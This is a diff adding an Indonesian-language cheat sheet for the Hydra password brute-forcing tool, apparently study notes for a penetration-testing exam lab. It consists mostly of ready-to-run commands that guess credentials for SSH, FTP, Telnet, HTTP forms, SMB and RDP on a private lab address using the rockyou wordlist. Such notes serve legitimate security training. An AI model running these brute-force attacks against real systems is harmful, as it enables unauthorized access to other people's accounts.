@@ -1,0 +1,84 @@
+
+# HYDRA CHEATSHEET
+
+1. Dasar Hydra
+
+---
+
+Hydra digunakan untuk brute force login service (SSH, FTP, HTTP, SMB, dll).
+Format umum:
+hydra -l <user> -P <wordlist> <protocol>://<target-ip>
+
+Parameter penting:
+
+* -l → single username
+* -L → wordlist username
+* -p → single password
+* -P → wordlist password
+* -t → jumlah thread (default 16)
+* -V → tampilkan setiap percobaan
+
+2. Brute Force SSH
+
+---
+
+Single user:
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+
+Userlist dan passlist:
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+
+3. Brute Force FTP
+
+---
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp\://192.168.56.101
+
+4. Brute Force Telnet
+
+---
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.101
+
+5. Brute Force HTTP Basic Auth
+
+---
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-get /
+
+Hydra dengan metode POST form:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/login.php\:user=^USER^\&pass=^PASS^\:Invalid login"
+
+Hydra dengan metode GET form:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-get-form "/login.php\:user=^USER^\&pass=^PASS^\:Invalid"
+
+6. Brute Force SMB
+
+---
+
+hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.56.101
+
+7. Brute Force RDP
+
+---
+
+hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp\://192.168.56.101
+
+8. Output Hasil
+
+---
+
+Simpan hasil ke file:
+hydra -l admin -P rockyou.txt ssh://192.168.56.101 -o hasil.txt
+
+9. Tips Praktis
+
+---
+
+* Gunakan -t 4 atau -t 8 jika VM lambat (hindari overload).
+* Gunakan -V untuk debug → cek payload yang dicoba.
+* Fokus ke service yang terbuka (hasil Nmap).
+* Gunakan wordlist kecil untuk ujian (biar cepat).
+* Jika brute force gagal, dokumentasikan “tidak ditemukan kredensial valid”.
+
+---
